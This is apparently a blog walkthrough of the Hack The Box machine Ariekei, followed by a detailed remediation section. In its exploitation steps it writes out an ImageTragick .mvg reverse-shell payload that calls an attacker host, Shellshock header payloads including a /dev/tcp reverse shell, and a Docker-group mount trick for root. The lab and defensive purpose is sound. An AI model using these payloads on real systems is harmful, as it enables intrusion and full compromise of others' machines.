---
title: "Ariekei HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T10:15:00Z
tags: ["insane-linux", "nmap", "virtual-hosts", "shellshock", "imagetragick", "ssh-pivoting", "docker-escape", "privilege-escalation", "cve-2014-6271", "cve-2016-3714", "network-segmentation", "container-exploitation"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Ariekei HTB machine featuring network segmentation, Shellshock and ImageTragick exploits, SSH pivoting through containers, and Docker privilege escalation techniques"
---

# Ariekei HTB - Insane Linux Box Walkthrough

{{< youtube Pc4tzsn-ats >}}

## Key Exploitation Steps and Techniques

Below is a chronological summary of the key exploitation steps and techniques used to compromise the "Ariekei" machine from Hack The Box, as described in the provided data.

### 1. Initial Reconnaissance with Nmap

**Technique**: Network scanning using Nmap to identify open ports and services.

**Details**:
- Ran `nmap -sC -sV -oA nmap_initial [TARGET-IP]` to scan the target IP.
- Identified open ports: SSH on 22, Nginx (HTTP) on 443, and SSH on 1022.
- Noted different SSH host keys and Ubuntu versions (Trusty and Xenial), indicating multiple hosts or network address translation (NAT).
- Observed SSL certificate with Subject Alternative Names (SANs): `calvin.direct.ih.db` and `beehive.direct.ih.db`, hinting at virtual host routing.

**Purpose**: Gather initial information about the target, identify potential entry points, and detect network segmentation.

### 2. Web Enumeration and Virtual Host Routing

**Technique**: Web enumeration using GoBuster and manual inspection via Burp Suite.

**Details**:
- Visited `https://[TARGET-IP]:443` and found a maintenance page with no significant content.
- Ran GoBuster: `gobuster dir -u https://[TARGET-IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 50 --status 403` to enumerate directories, discovering `/blog` and `/cgi-bin`.
- Identified virtual host routing by testing hostnames (`beehive.direct.ih.db` and `calvin.direct.ih.db`) via Burp Suite Repeater, noting different responses (e.g., 404 for `calvin.direct.ih.db`).
- Confirmed presence of a Web Application Firewall (WAF) via the `X-RackI-Laughs` header.

**Purpose**: Identify web directories, confirm virtual host routing, and detect WAF presence.

### 3. Shellshock Vulnerability Exploitation

**Technique**: Exploiting the Shellshock vulnerability (CVE-2014-6271) in a CGI script.

**Details**:
- Discovered `/cgi-bin/stats` on `beehive.direct.ih.db`, which returned Bash version 4.3, known to be vulnerable to Shellshock.
- Attempted Shellshock exploitation by modifying the User-Agent header in Burp Suite Repeater to `() { :;}; echo; /bin/whoami`, but the WAF blocked it due to specific signatures (e.g., `() {`).
- Failed to bypass WAF after fuzzing attempts, indicating a potential rabbit hole.

**Purpose**: Attempt to gain initial code execution on the beehive host via Shellshock, though blocked by WAF.

### 4. ImageTragick Vulnerability Exploitation

**Technique**: Exploiting ImageTragick (CVE-2016-3714) via file upload on `calvin.direct.ih.db`.

**Details**:
- Discovered `/uploads` on `calvin.direct.ih.db` with an image upload feature.
- Noted a hint in the form of "tragedy masks" referencing ImageTragick, a vulnerability in ImageMagick allowing command injection via malicious image files.
- Created a malicious `.mvg` file with a payload for a reverse shell: `fill 'url(https://attacker.com|setsid /bin/bash -i >& /dev/tcp/[ATTACKER-IP]/443 0>&1)'`.
- Uploaded the file via Burp Suite, correcting an encoding issue (hex 22 for quotes) from a CloudFlare blog reference.
- Successfully triggered a reverse shell to the attacker's machine (`[ATTACKER-IP]:443`), gaining access to the calvin container.

**Purpose**: Gain a reverse shell on the calvin container by exploiting ImageTragick.

### 5. Pivoting to Bastion Host

**Technique**: Using SSH key for lateral movement and network pivoting.

**Details**:
- On the calvin container (IP: 172.23.0.11), found a hidden `.secrets` directory containing `bastion_key`.
- Used the key to SSH into `[TARGET-IP]:1022`, landing on the bastion host (dual-homed with IPs 172.23.0.253 and 172.24.0.253).
- Confirmed bastion host connects to both 172.23.0.0/24 and 172.24.0.0/24 networks, allowing access to other containers.

**Purpose**: Pivot from calvin to the bastion host for further network exploration.

### 6. Accessing the Beehive Container

**Technique**: SSH tunneling and Shellshock exploitation on the beehive container.

**Details**:
- On the bastion host, set up an SSH tunnel using `~C` and `-L 8001:172.24.0.2:80` to forward traffic to the beehive container.
- Accessed `http://localhost:8001/cgi-bin/stats` and successfully exploited Shellshock (no WAF interference) with a reverse shell payload: `() { :;}; /bin/bash -i >& /dev/tcp/172.24.0.253/8002 0>&1`.
- Gained a reverse shell on the beehive container, confirmed by spawning a Python TTY shell.

**Purpose**: Gain code execution on the beehive container by bypassing the WAF using internal network access.

### 7. Privilege Escalation to Root on Containers

**Technique**: Extracting and using root credentials from shared Docker configuration.

**Details**:
- On the beehive container, navigated to `/common/containers/bastion/Dockerfile` and found a root password shared across all containers.
- Used `su` with the password to escalate to root on beehive, calvin, and bastion containers.

**Purpose**: Achieve root access on all Docker containers.

### 8. Pivoting to the Host Machine

**Technique**: SSH key cracking and privilege escalation via Docker group membership.

**Details**:
- Found an SSH private key for the `spanish_dancer` user in `/home/spanish_dancer/.ssh/id_rsa` on a container.
- Cracked the key using John the Ripper with the password `purple1`.
- Used the key to SSH into the host machine (`[TARGET-IP]`) as `spanish_dancer`.
- Identified `spanish_dancer` as part of the `docker` group, allowing privilege escalation via Docker.

**Purpose**: Gain access to the host machine as a low-privileged user.

### 9. Host Privilege Escalation via Docker

**Technique**: Docker privilege escalation by mounting the host filesystem.

**Details**:
- Ran `docker run -v /:/mnt -i -t bash` to mount the host's root filesystem to `/mnt` in a new container.
- Accessed `/mnt/root` to retrieve `root.txt`.
- Alternatively, added an SSH key to `/mnt/root/.ssh/authorized_keys` and used it to SSH as the root user to `[TARGET-IP]`.

**Purpose**: Achieve root access on the host machine by exploiting Docker group privileges.

### 10. Alternative Root Access Attempt via Cron

**Technique**: Attempted to leverage a cron job for code execution (unsuccessful).

**Details**:
- Tried creating a cron job in `/mnt/var/spool/cron/crontabs/root` to run a reverse shell, but it failed due to configuration errors.
- Abandoned this approach in favor of the SSH key method.

**Purpose**: Explore alternative methods for host root access (not successful).

## Summary

The exploitation process involved:

1. Initial reconnaissance to identify network segmentation and virtual hosts.
2. Exploiting ImageTragick for initial access to the calvin container.
3. Pivoting to the bastion host using an SSH key.
4. Bypassing the WAF to exploit Shellshock on the beehive container.
5. Escalating to root on containers using shared credentials.
6. Pivoting to the host machine and escalating privileges via Docker group membership.

This sequence leveraged network pivoting, vulnerability exploitation, and privilege escalation to fully compromise the "Ariekei" machine.

## Security Gaps and Remediation

Below is a list of identified gaps in services or systems from the "Ariekei" Hack The Box scenario, along with specific fixes that can be applied through proper source code or configuration changes. Each gap is tied to the vulnerabilities and misconfigurations exploited in the provided data, focusing on actionable remediation steps.

### 1. Web Application Firewall (WAF) Misconfiguration
- **Gap**: The WAF (indicated by the `X-RackI-Laughs` header) failed to adequately protect the `beehive` container from Shellshock exploitation when accessed internally via the `bastion` host, despite blocking it externally.
- **Impact**: Allowed internal Shellshock exploitation on `/cgi-bin/stats`, bypassing WAF protections.
- **Fix**:
  - **Configuration Fix**:
    - Update WAF rules to consistently block Shellshock signatures (e.g., `() { :;};`) across all network interfaces, not just external traffic.
    - Ensure WAF applies to internal traffic (e.g., from `172.24.0.0/24` network) by configuring it to inspect all requests to the `beehive` container, regardless of source.
    - Implement deep packet inspection to detect encoded or obfuscated Shellshock payloads (e.g., spaces or alternative characters).
  - **Source Code Fix**:
    - If the WAF is custom-built, update the signature detection logic to handle variations of Shellshock payloads (e.g., spaces, encoded characters) and log all blocked attempts for auditing.
- **Verification**: Test WAF effectiveness by simulating Shellshock attempts from both external and internal networks, ensuring no payloads bypass the filter.

### 2. Shellshock Vulnerability in Bash (CVE-2014-6271)
- **Gap**: The `beehive` container ran Bash version 4.3, vulnerable to Shellshock, allowing command injection via the `/cgi-bin/stats` script.
- **Impact**: Enabled code execution and reverse shell establishment on the `beehive` container.
- **Fix**:
  - **Configuration Fix**:
    - Upgrade Bash to a patched version (e.g., 4.3.30 or later) where Shellshock vulnerabilities (CVE-2014-6271, CVE-2014-7169) are fixed.
    - Disable or remove unnecessary CGI scripts (`/cgi-bin/stats`) to reduce the attack surface.
    - Restrict CGI execution in Apache/Nginx configuration by limiting `ScriptAlias` to trusted scripts or disabling it entirely if not needed (`Options -ExecCGI` in Apache).
  - **Source Code Fix**:
    - If custom CGI scripts are used, sanitize environment variables (e.g., `HTTP_USER_AGENT`) to prevent command injection.
    - Implement input validation in the `stats` script to reject malformed or suspicious inputs.
- **Verification**: Run `bash --version` to confirm the updated version and test `/cgi-bin/stats` with Shellshock payloads to ensure no execution occurs.

### 3. ImageTragick Vulnerability in ImageMagick (CVE-2016-3714)
- **Gap**: The `calvin` container's image upload functionality (via `/uploads`) used a vulnerable version of ImageMagick, susceptible to ImageTragick command injection.
- **Impact**: Allowed attackers to upload malicious `.mvg` files, leading to a reverse shell.
- **Fix**:
  - **Configuration Fix**:
    - Upgrade ImageMagick to a version patched against CVE-2016-3714 (e.g., 6.9.3-9 or later).
    - Configure ImageMagick's policy file (`/etc/ImageMagick-6/policy.xml`) to disable vulnerable file formats (e.g., MVG, MSL) by adding:
      ```xml
      <policy domain="coder" rights="none" pattern="MVG" />
      <policy domain="coder" rights="none" pattern="MSL" />
      ```
    - Restrict file uploads to safe formats (e.g., PNG, JPEG) using server-side validation in the upload handler.
    - Limit the upload directory's permissions to prevent execution of uploaded files (`chmod 644 /uploads`).
  - **Source Code Fix**:
    - Implement strict file type validation in the upload script to reject non-image files (e.g., check MIME types and file signatures).
    - Sanitize file contents to prevent command injection (e.g., strip metadata or use a sandboxed ImageMagick process).
  - **Verification**: Test uploads with malicious `.mvg` files to ensure they are rejected or processed safely without command execution.

### 4. Insecure SSH Key Storage
- **Gap**: A private SSH key (`bastion_key`) was stored in a readable directory (`/common/.secrets`) on the `calvin` container, accessible to attackers with initial access.
- **Impact**: Enabled pivoting to the `bastion` host via SSH (`[TARGET-IP]:1022`).
- **Fix**:
  - **Configuration Fix**:
    - Remove unnecessary SSH keys from containers and store them securely (e.g., in a vault or encrypted storage accessible only to authorized services).
    - Restrict file permissions on sensitive directories (e.g., `chmod 600 /common/.secrets/bastion_key` and `chown root:root /common/.secrets`).
    - Disable SSH access to containers unless strictly required, or use temporary credentials with short-lived keys.
  - **Source Code Fix**:
    - If SSH key generation is scripted, ensure keys are created with restricted permissions (e.g., `0600`) and stored in a secure location inaccessible to non-root users.
    - Implement a key management system to rotate and revoke keys automatically.
  - **Verification**: Check file permissions (`ls -la /common/.secrets`) and attempt unauthorized access to confirm keys are inaccessible.

### 5. Weak SSH Key Passphrase
- **Gap**: The SSH private key for the `spanish_dancer` user was encrypted with a weak passphrase (`purple1`), easily cracked using John the Ripper.
- **Impact**: Allowed access to the host machine as the `spanish_dancer` user.
- **Fix**:
  - **Configuration Fix**:
    - Enforce strong passphrases for SSH keys using policies (e.g., minimum length, complexity requirements).
    - Use SSH key management tools (e.g., OpenSSH's `ssh-agent` or HashiCorp Vault) to avoid storing passphrases in plaintext or weak formats.
    - Regularly audit and rotate SSH keys to minimize the impact of compromised keys.
  - **Source Code Fix**:
    - If keys are generated programmatically, enforce strong passphrase generation using a secure random generator (e.g., `/dev/urandom` or a cryptographic library).
  - **Verification**: Attempt to crack SSH keys with tools like John the Ripper to ensure passphrases resist brute-forcing.

### 6. Shared Root Password Across Docker Containers
- **Gap**: A single root password was embedded in the `Dockerfile` under `/common/containers/bastion`, shared across all containers (`calvin`, `beehive`, `bastion`).
- **Impact**: Allowed root privilege escalation on all containers after initial access.
- **Fix**:
  - **Configuration Fix**:
    - Remove hardcoded passwords from `Dockerfile` and use secure secret management (e.g., Docker Secrets, AWS Secrets Manager, or environment variables).
    - Enforce unique credentials for each container and disable root logins (`PermitRootLogin no` in `/etc/ssh/sshd_config`).
    - Use least privilege principles, running containers as non-root users where possible (`USER nonroot` in `Dockerfile`).
  - **Source Code Fix**:
    - If passwords are managed programmatically, implement secure credential injection using a secrets management API instead of embedding in configuration files.
  - **Verification**: Check `Dockerfile` and container configurations for hardcoded credentials and test non-root operation of services.

### 7. Docker Group Privilege Escalation
- **Gap**: The `spanish_dancer` user on the host machine was part of the `docker` group, allowing unrestricted Docker commands to mount the host filesystem and gain root access.
- **Impact**: Enabled privilege escalation by running a Docker container with the host's root filesystem mounted (`docker run -v /:/mnt`).
- **Fix**:
  - **Configuration Fix**:
    - Remove non-essential users from the `docker` group to prevent unauthorized container execution (`gpasswd -d spanish_dancer docker`).
    - Restrict Docker socket access (`/var/run/docker.sock`) to root only (`chmod 600 /var/run/docker.sock`).
    - Use Docker's user namespace feature to isolate container privileges, preventing host filesystem access.
    - Implement Role-Based Access Control (RBAC) for Docker operations, limiting who can run privileged containers.
  - **Source Code Fix**:
    - If Docker is managed via scripts, enforce strict user checks to prevent non-root users from executing privileged commands.
  - **Verification**: Test Docker commands as a non-root user to ensure privilege escalation is blocked.

### 8. Exposed Docker Configuration Files
- **Gap**: Sensitive Docker configuration files (e.g., `/common/containers`) were accessible within containers, exposing network details and credentials.
- **Impact**: Provided attackers with network topology (`172.23.0.0/24`, `172.24.0.0/24`) and credentials for pivoting.
- **Fix**:
  - **Configuration Fix**:
    - Restrict access to the `/common` directory with strict permissions (`chmod 700 /common`, `chown root:root /common`).
    - Avoid mounting sensitive directories into containers unless necessary, using Docker's volume management to isolate configurations.
    - Use Docker's `read-only` filesystem option for containers (`docker run --read-only`) to prevent modifications to sensitive files.
  - **Source Code Fix**:
    - If configuration files are generated programmatically, ensure sensitive data is excluded or encrypted before being mounted into containers.
  - **Verification**: Attempt to access `/common` from within containers as a non-root user to confirm inaccessibility.

### 9. Unnecessary SSH Services on Multiple Ports
- **Gap**: SSH services were running on both ports 22 and 1022, with different host keys and Ubuntu versions, increasing the attack surface and hinting at NAT or misconfiguration.
- **Impact**: Provided multiple entry points, with the older version (Trusty) being more vulnerable.
- **Fix**:
  - **Configuration Fix**:
    - Consolidate SSH services to a single port (e.g., 22) and disable unnecessary instances (`systemctl disable sshd@1022`).
    - Upgrade all SSH servers to the latest version of OpenSSH and patch the underlying OS (e.g., from Trusty to a supported version).
    - Harden SSH configuration in `/etc/ssh/sshd_config`:
      - Disable root login (`PermitRootLogin no`).
      - Use strong ciphers and key algorithms (e.g., `Ciphers aes256-ctr`, `HostKeyAlgorithms ssh-ed25519`).
      - Enable public key authentication only (`PasswordAuthentication no`).
  - **Source Code Fix**:
    - If SSH is managed programmatically, ensure only one instance is configured with secure defaults.
  - **Verification**: Run `nmap` to confirm only one SSH port is open and test SSH configurations for vulnerabilities.

### 10. Lack of Input Validation in Web Application
- **Gap**: The web application on `calvin` (`/uploads`) lacked proper input validation, allowing arbitrary file uploads without checking file types or contents.
- **Impact**: Facilitated ImageTragick exploitation by allowing malicious `.mvg` files.
- **Fix**:
  - **Configuration Fix**:
    - Configure the web server (e.g., Nginx) to restrict file uploads to specific extensions using location blocks:
      ```nginx
      location /uploads {
          if ($request_filename !~ \.(jpg|jpeg|png|gif)$) {
              return 403;
          }
      }
      ```
    - Limit upload size to prevent abuse (`client_max_body_size 1m` in Nginx).
  - **Source Code Fix**:
    - Implement server-side validation in the upload handler to check file signatures (e.g., using `libmagic` to verify image formats).
    - Sanitize uploaded files by stripping metadata or converting them to safe formats before processing.
  - **Verification**: Test uploads with non-image files (e.g., `.mvg`, `.php`) to ensure they are rejected.

### 11. Static Web Content Serving PHP Files
- **Gap**: The `/blog` directory on `beehive` served PHP files as static content, exposing source code (e.g., `contact_me.php`) instead of executing it.
- **Impact**: While not directly exploited, this exposed application logic and increased the attack surface.
- **Fix**:
  - **Configuration Fix**:
    - Configure the web server to execute PHP files using a PHP handler (e.g., FastCGI with `php-fpm`):
      ```nginx
      location ~ \.php$ {
          include fastcgi_params;
          fastcgi_pass unix:/run/php/php-fpm.sock;
          fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
      }
      ```
    - Alternatively, remove PHP files from static directories if execution is not intended.
  - **Source Code Fix**:
    - Ensure sensitive logic in PHP scripts is protected or obfuscated if execution is disabled.
  - **Verification**: Access PHP files to confirm they either execute correctly or are inaccessible.

### 12. Exposed Network Information via SSL Certificate
- **Gap**: The SSL certificate on port 443 exposed internal hostnames (`calvin.direct.ih.db`, `beehive.direct.ih.db`) via Subject Alternative Names (SANs).
- **Impact**: Provided attackers with network topology hints, facilitating virtual host routing attacks.
- **Fix**:
  - **Configuration Fix**:
    - Configure the SSL certificate to exclude internal hostnames from SANs, using only public-facing domains.
    - Generate a new certificate with minimal information:
      ```bash
      openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=direct.ih.db"
      ```
    - Use separate certificates for internal and external services to avoid leakage.
  - **Source Code Fix**:
    - If certificates are generated programmatically, ensure SANs are dynamically set to exclude internal hostnames.
  - **Verification**: Inspect the SSL certificate (`openssl s_client -connect [TARGET-IP]:443`) to confirm no internal hostnames are exposed.

### Summary of Fixes
- **WAF**: Strengthen rules to block Shellshock consistently across all networks.
- **Bash**: Upgrade to a patched version and disable unnecessary CGI scripts.
- **ImageMagick**: Patch ImageMagick, restrict file formats, and validate uploads.
- **SSH Keys**: Secure key storage, enforce strong passphrases, and limit access.
- **Root Password**: Remove hardcoded credentials and use secret management.
- **Docker Group**: Restrict `docker` group membership and socket access.
- **Docker Configs**: Secure configuration files with strict permissions.
- **SSH Services**: Consolidate to one port, harden configurations, and patch servers.
- **Web Application**: Validate uploads and configure PHP execution correctly.
- **SSL Certificate**: Remove internal hostnames from SANs.

These fixes address the exploited vulnerabilities and misconfigurations, significantly reducing the attack surface and preventing similar attacks. Verification steps ensure each fix is effective.

## Conclusion

Ariekei is an excellent machine that demonstrates the complexity of network segmentation and container exploitation. It requires expertise in:
- Network reconnaissance and virtual host enumeration
- Shellshock and ImageTragick vulnerability exploitation
- SSH key management and network pivoting techniques
- Docker container security and privilege escalation
- Multi-layer network architecture exploitation
- Advanced penetration testing methodologies across segmented networks

The machine emphasizes the importance of proper network segmentation, container security, WAF configuration, and vulnerability management in enterprise environments.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*